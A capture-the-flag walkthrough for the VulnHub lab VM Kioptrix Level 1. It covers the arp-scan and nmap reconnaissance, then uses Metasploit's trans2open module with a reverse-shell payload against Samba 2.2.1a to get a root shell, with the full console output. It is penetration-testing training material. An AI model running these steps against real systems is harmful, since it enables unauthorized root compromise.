```
Machine: Kioptrix Level 1
Platform: VulnHub
Difficulty: Easy
```

## WALKTHROUGH:
The machine can be found [here](https://www.vulnhub.com/entry/kioptrix-level-1-1,22/)

### Network Discovery:
Fire up the Kioptrix VM and attacking machine (mine is Kali Linux). Go to the terminal and start the network discovery for your target: **Kioptrix**. 

Use the following command: `sudo arp-scan -l`

![Untitled](https://github.com/user-attachments/assets/5c700e21-b79f-4745-b612-5f233f7f1e05)

Now we have get the IP of the target machine, let's move forward

### Reconnaissance:

Now we will scan the services running on the target ip that is obtained from previous step. For this use nmap command: `sudo nmap -A -sV -sS 192.168.78.131`

```console
┌──(kali㉿kali)-[~]
└─$ sudo nmap -A -sV -sS 192.168.78.131
Starting Nmap 7.94 ( https://nmap.org ) at 2024-07-27 14:46 EDT
Nmap scan report for 192.168.78.131
Host is up (0.0013s latency).
Not shown: 994 closed tcp ports (reset)
PORT      STATE SERVICE     VERSION
22/tcp    open  ssh         OpenSSH 2.9p2 (protocol 1.99)
| ssh-hostkey: 
|   1024 b8:74:6c:db:fd:8b:e6:66:e9:2a:2b:df:5e:6f:64:86 (RSA1)
|   1024 8f:8e:5b:81:ed:21:ab:c1:80:e1:57:a3:3c:85:c4:71 (DSA)
|_  1024 ed:4e:a9:4a:06:14:ff:15:14:ce:da:3a:80:db:e2:81 (RSA)
|_sshv1: Server supports SSHv1
80/tcp    open  http        Apache httpd 1.3.20 ((Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
|_http-title: Test Page for the Apache Web Server on Red Hat Linux
111/tcp   open  rpcbind     2 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2            111/tcp   rpcbind
|   100000  2            111/udp   rpcbind
|   100024  1          32768/tcp   status
|_  100024  1          32768/udp   status
139/tcp   open  netbios-ssn Samba smbd (workgroup: MYGROUP)
443/tcp   open  ssl/https   Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
| Not valid before: 2009-09-26T09:32:06
|_Not valid after:  2010-09-26T09:32:06
| sslv2: 
|   SSLv2 supported
|   ciphers: 
|     SSL2_RC2_128_CBC_WITH_MD5
|     SSL2_RC4_128_WITH_MD5
|     SSL2_RC4_128_EXPORT40_WITH_MD5
|     SSL2_RC4_64_WITH_MD5
|     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
|     SSL2_DES_192_EDE3_CBC_WITH_MD5
|_    SSL2_DES_64_CBC_WITH_MD5
|_http-title: 400 Bad Request
|_ssl-date: 2024-07-28T03:46:46+00:00; +9h00m04s from scanner time.
|_http-server-header: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
32768/tcp open  status      1 (RPC #100024)
MAC Address: 00:0C:29:71:93:25 (VMware)
Device type: general purpose
Running: Linux 2.4.X
OS CPE: cpe:/o:linux:linux_kernel:2.4
OS details: Linux 2.4.9 - 2.4.18 (likely embedded)
Network Distance: 1 hop

Host script results:
|_smb2-time: Protocol negotiation failed (SMB2)
|_nbstat: NetBIOS name: KIOPTRIX, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
|_clock-skew: 9h00m03s

TRACEROUTE
HOP RTT     ADDRESS
1   1.28 ms 192.168.78.131

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 22.78 seconds
                                                             
```

This shows number of services running on the target including ssh, http, smb, etc.

First I go to the web page as `http service` is running but we get nothing much and it gives us a default test page.

![2](https://github.com/user-attachments/assets/1faaf1d5-03f5-449a-8fa4-36130266066d)

So, I go back to the nmap scan results and look for other services and their versions. I've found a promising target for exploitation: the SMB service. Since the version is not disclosed, it's time to use our trusted tool, Metasploit, to proceed.

``` 
msfconsole
```

Here I searched for the `scanner smb` auxiliary module to scan the target and get the running version of the smb service.

```console
┌──(kali㉿kali)-[~]
└─$ sudo msfconsole   
                                                  

      .:okOOOkdc'           'cdkOOOko:.                                                                                                                    
    .xOOOOOOOOOOOOc       cOOOOOOOOOOOOx.                                                                                                                  
   :OOOOOOOOOOOOOOOk,   ,kOOOOOOOOOOOOOOO:                                                                                                                 
  'OOOOOOOOOkkkkOOOOO: :OOOOOOOOOOOOOOOOOO'                                                                                                                
  oOOOOOOOO.    .oOOOOoOOOOl.    ,OOOOOOOOo                                                                                                                
  dOOOOOOOO.      .cOOOOOc.      ,OOOOOOOOx                                                                                                                
  lOOOOOOOO.         ;d;         ,OOOOOOOOl                                                                                                                
  .OOOOOOOO.   .;           ;    ,OOOOOOOO.                                                                                                                
   cOOOOOOO.   .OOc.     'oOO.   ,OOOOOOOc                                                                                                                 
    oOOOOOO.   .OOOO.   :OOOO.   ,OOOOOOo                                                                                                                  
     lOOOOO.   .OOOO.   :OOOO.   ,OOOOOl                                                                                                                   
      ;OOOO'   .OOOO.   :OOOO.   ;OOOO;                                                                                                                    
       .dOOo   .OOOOocccxOOOO.   xOOd.                                                                                                                     
         ,kOl  .OOOOOOOOOOOOO. .dOk,                                                                                                                       
           :kk;.OOOOOOOOOOOOO.cOk:                                                                                                                         
             ;kOOOOOOOOOOOOOOOk:                                                                                                                           
               ,xOOOOOOOOOOOx,                                                                                                                             
                 .lOOOOOOOl.                                                                                                                               
                    ,dOd,                                                                                                                                  
                      .                                                                                                                                    

       =[ metasploit v6.3.27-dev                          ]
+ -- --=[ 2335 exploits - 1220 auxiliary - 413 post       ]
+ -- --=[ 1385 payloads - 46 encoders - 11 nops           ]
+ -- --=[ 9 evasion                                       ]

Metasploit tip: Save the current environment with the 
save command, future console restarts will use this 
environment again
Metasploit Documentation: https://docs.metasploit.com/

msf6 > search scanner smb

Matching Modules
================

   #   Name                                                            Disclosure Date  Rank    Check  Description
   -   ----                                                            ---------------  ----    -----  -----------
   0   auxiliary/scanner/http/citrix_dir_traversal                     2019-12-17       normal  No     Citrix ADC (NetScaler) Directory Traversal Scanner
   1   auxiliary/scanner/smb/impacket/dcomexec                         2018-03-19       normal  No     DCOM Exec
   2   auxiliary/scanner/smb/impacket/secretsdump                                       normal  No     DCOM Exec
   3   auxiliary/scanner/dcerpc/dfscoerce                                               normal  No     DFSCoerce
   4   auxiliary/scanner/smb/smb_ms17_010                                               normal  No     MS17-010 SMB RCE Detection
   5   auxiliary/scanner/smb/psexec_loggedin_users                                      normal  No     Microsoft Windows Authenticated Logged In Users Enumeration
   6   auxiliary/scanner/dcerpc/petitpotam                                              normal  No     PetitPotam
   7   auxiliary/scanner/sap/sap_smb_relay                                              normal  No     SAP SMB Relay Abuse
   8   auxiliary/scanner/sap/sap_soap_rfc_eps_get_directory_listing                     normal  No     SAP SOAP RFC EPS_GET_DIRECTORY_LISTING Directories Information Disclosure
   9   auxiliary/scanner/sap/sap_soap_rfc_pfl_check_os_file_existence                   normal  No     SAP SOAP RFC PFL_CHECK_OS_FILE_EXISTENCE File Existence Check
   10  auxiliary/scanner/sap/sap_soap_rfc_rzl_read_dir                                  normal  No     SAP SOAP RFC RZL_READ_DIR_LOCAL Directory Contents Listing
   11  auxiliary/scanner/smb/smb_enumusers_domain                                       normal  No     SMB Domain User Enumeration
   12  auxiliary/scanner/smb/smb_enum_gpp                                               normal  No     SMB Group Policy Preference Saved Passwords Enumeration
   13  auxiliary/scanner/smb/smb_login                                                  normal  No     SMB Login Check Scanner
   14  auxiliary/scanner/smb/smb_lookupsid                                              normal  No     SMB SID User Enumeration (LookupSid)
   15  auxiliary/admin/smb/check_dir_file                                               normal  No     SMB Scanner Check File/Directory Utility
   16  auxiliary/scanner/smb/pipe_auditor                                               normal  No     SMB Session Pipe Auditor
   17  auxiliary/scanner/smb/pipe_dcerpc_auditor                                        normal  No     SMB Session Pipe DCERPC Auditor
   18  auxiliary/scanner/smb/smb_enumshares                                             normal  No     SMB Share Enumeration
   19  auxiliary/scanner/smb/smb_enumusers                                              normal  No     SMB User Enumeration (SAM EnumUsers)
   20  auxiliary/scanner/smb/smb_version                                                normal  No     SMB Version Detection
   21  auxiliary/scanner/snmp/snmp_enumshares                                           normal  No     SNMP Windows SMB Share Enumeration
   22  auxiliary/scanner/smb/smb_uninit_cred                                            normal  Yes    Samba _netr_ServerPasswordSet Uninitialized Credential State
   23  auxiliary/scanner/smb/impacket/wmiexec                          2018-03-19       normal  No     WMI Exec

Interact with a module by name or index. For example info 23, use 23 or use auxiliary/scanner/smb/impacket/wmiexec

```

Now I have found the scanner for the smb version which is module 20 for the list and then use it. Set the `RHOSTS` with the target IP `192.168.78.131` and then `run` the module.

```console
msf6 > use auxiliary/scanner/smb/smb_version
msf6 auxiliary(scanner/smb/smb_version) > show options
                                                                                                                                                           
Module options (auxiliary/scanner/smb/smb_version):                                                                                                        

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   RHOSTS                    yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   THREADS  1                yes       The number of concurrent threads (max one per host)

View the full module info with the info, or info -d command.

msf6 auxiliary(scanner/smb/smb_version) > set RHOSTS 192.168.78.131
RHOSTS => 192.168.78.131
msf6 auxiliary(scanner/smb/smb_version) > show options

Module options (auxiliary/scanner/smb/smb_version):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   RHOSTS   192.168.78.131   yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   THREADS  1                yes       The number of concurrent threads (max one per host)

View the full module info with the info, or info -d command.

msf6 auxiliary(scanner/smb/smb_version) > run

[*] 192.168.78.131:139    - SMB Detected (versions:) (preferred dialect:) (signatures:optional)
[*] 192.168.78.131:139    -   Host could not be identified: Unix (Samba 2.2.1a)
[*] 192.168.78.131:       - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed

```

This shows the version of the Samba service that was: “Samba 2.2.1a”

Now we have got the version, it’s time search for the available exploit to attack on this. For this, I moved to Google and simply search for the exploit for the samba version. I got the result from rapid 7 link with name `trans2open`.

![3](https://github.com/user-attachments/assets/31b81922-194b-4aea-8eb3-bac84cf11743)

### Exploitation:
As the exploit is available on `Rapid7` which means that its module will surely be available on `metasploit`
Now I moved back to metasploit and search for the available exploit for “trans2open”.

```console
msf6 > search trans2open

Matching Modules
================

   #  Name                              Disclosure Date  Rank   Check  Description
   -  ----                              ---------------  ----   -----  -----------
   0  exploit/freebsd/samba/trans2open  2003-04-07       great  No     Samba trans2open Overflow (*BSD x86)
   1  exploit/linux/samba/trans2open    2003-04-07       great  No     Samba trans2open Overflow (Linux x86)
   2  exploit/osx/samba/trans2open      2003-04-07       great  No     Samba trans2open Overflow (Mac OS X PPC)
   3  exploit/solaris/samba/trans2open  2003-04-07       great  No     Samba trans2open Overflow (Solaris SPARC)

Interact with a module by name or index. For example info 3, use 3 or use exploit/solaris/samba/trans2open

```

There are multiple exploits available, we have to choose for linux, which is on `number 1`.
- use exploit/linux/samba/trans2open or use 1 
- show options
- set the RHOSTS with the target IP i.e. `192.168.78.131`
- set payload to linux/x86/shell_reverse_tcp

```console
msf6 > use exploit/linux/samba/trans2open
[*] No payload configured, defaulting to linux/x86/meterpreter/reverse_tcp
msf6 exploit(linux/samba/trans2open) > show options

Module options (exploit/linux/samba/trans2open):

   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   RHOSTS                   yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT   139              yes       The target port (TCP)

Payload options (linux/x86/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.78.129   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port

Exploit target:

   Id  Name
   --  ----
   0   Samba 2.2.x - Bruteforce

View the full module info with the info, or info -d command.

msf6 exploit(linux/samba/trans2open) > set RHOSTS 192.168.78.131
RHOSTS => 192.168.78.131
msf6 exploit(linux/samba/trans2open) > set payload linux/x86/shell_reverse_tcp
payload => linux/x86/shell_reverse_tcp

```
Now use `show options` command to check that everything is set properly.

```console
msf6 exploit(linux/samba/trans2open) > show options

Module options (exploit/linux/samba/trans2open):

   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   RHOSTS  192.168.78.131   yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT   139              yes       The target port (TCP)

Payload options (linux/x86/shell_reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   CMD    /bin/sh          yes       The command string to execute
   LHOST  192.168.78.129   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port

Exploit target:

   Id  Name
   --  ----
   0   Samba 2.2.x - Bruteforce

View the full module info with the info, or info -d command.
```

Then simply run the exploit and **voilà**!, I get the root shell.

```console
msf6 exploit(linux/samba/trans2open) > exploit

[*] Started reverse TCP handler on 192.168.78.129:4444 
[*] 192.168.78.131:139 - Trying return address 0xbffffdfc...
[*] 192.168.78.131:139 - Trying return address 0xbffffcfc...
[*] 192.168.78.131:139 - Trying return address 0xbffffbfc...
[*] 192.168.78.131:139 - Trying return address 0xbffffafc...
[*] 192.168.78.131:139 - Trying return address 0xbffff9fc...
[*] 192.168.78.131:139 - Trying return address 0xbffff8fc...
[*] 192.168.78.131:139 - Trying return address 0xbffff7fc...
[*] 192.168.78.131:139 - Trying return address 0xbffff6fc...
[*] Command shell session 1 opened (192.168.78.129:4444 -> 192.168.78.131:32777) at 2024-07-29 12:50:46 -0400

[*] Command shell session 2 opened (192.168.78.129:4444 -> 192.168.78.131:32778) at 2024-07-29 12:50:47 -0400
[*] Command shell session 3 opened (192.168.78.129:4444 -> 192.168.78.131:32779) at 2024-07-29 12:50:48 -0400
[*] Command shell session 4 opened (192.168.78.129:4444 -> 192.168.78.131:32780) at 2024-07-29 12:50:50 -0400
id
uid=0(root) gid=0(root) groups=99(nobody)
whoami
root

```

That’s it for this machine we have to gain the root access. This can be done in numerous ways, this is one of them.

---
## Happy Hacking ;)
---
